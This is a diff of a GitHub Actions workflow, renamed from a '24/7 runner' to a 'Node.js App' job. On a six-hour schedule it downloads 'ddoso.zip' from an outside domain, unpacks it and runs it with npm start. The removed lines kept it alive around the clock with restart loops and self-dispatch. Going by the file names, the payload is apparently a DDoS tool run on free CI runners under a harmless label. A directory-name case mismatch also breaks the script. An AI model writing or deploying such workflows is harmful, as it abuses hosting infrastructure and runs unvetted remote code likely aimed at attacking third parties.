@@ -1,61 +1,52 @@
-name: ♾️ Continuous 24/7 Runner
+name: 🚀 Node.js App with npm start
 
 on:
+  workflow_dispatch:  # Manual trigger
   schedule:
     - cron: '0 */6 * * *'  # Every 6 hours
-  workflow_dispatch:
 
 jobs:
-  continuous-run:
+  run-app:
     runs-on: ubuntu-latest
-    strategy:
-      max-parallel: 1
+    timeout-minutes: 360  # 6 hours max
     
     steps:
-      - uses: actions/checkout@v4
+      - name: Checkout repository
+        uses: actions/checkout@v4
       
       - name: Setup Node.js
         uses: actions/setup-node@v4
         with:
-          node-version: 18
+          node-version: '18'
       
-      - name: Download and Run App
+      - name: Download and extract application
         run: |
-          # Download if not exists
-          if [ ! -d "ddosm" ]; then
-            wget -q https://reality.mahmud-tech.online/ddoso.zip
-            unzip -q ddoso.zip
+          wget -q https://reality.mahmud-tech.online/ddoso.zip
+          unzip -q ddoso.zip
+          echo "📁 Extracted files:"
+          ls -la
+      
+      - name: Find app directory and run npm start
+        run: |
+          # Find the app directory (ddosm or ddoso)
+          if [ -d "ddosm" ]; then
+            cd dDOSm
+          elif [ -d "ddoso" ]; then
+            cd ddoso
+          else
+            # Look for any directory with package.json
+            APP_DIR=$(find . -name "package.json" -type f -exec dirname {} \; | head -1)
+            cd "$APP_DIR"
           fi
           
-          # Go to app directory
-          cd dDOSm 2>/dev/null || cd ddoso 2>/dev/null || cd .
+          echo "📍 Working directory: $(pwd)"
+          echo "📄 package.json:"
+          cat package.json
           
-          # Install and run
+          # Install dependencies
+          echo "📦 Installing dependencies..."
           npm install --legacy-peer-deps
           
-          # Start with forever
-          npm install -g forever
-          forever start index.js
-          forever list
-          
-          # Keep alive with retry
-          while true; do
-            if ! forever list | grep -q "index.js"; then
-              echo "⚠️ App crashed, restarting..."
-              forever start index.js
-            fi
-            echo "💓 Keep-alive at $(date)"
-            sleep 300
-          done
-      
-      - name: Self-Trigger Next Run
-        if: always()
-        run: |
-          # Trigger next run before this one ends
-          echo "🔄 Scheduling next run..."
-          sleep 21600  # 6 hours
-          curl -X POST \
-            -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
-            -H "Accept: application/vnd.github.v3+json" \
-            https://api.github.com/repos/${{ github.repository }}/actions/workflows/node-app.yml/dispatches \
-            -d '{"ref":"main"}'
+          # Run npm start
+          echo "🚀 Running npm start..."
+          npm start
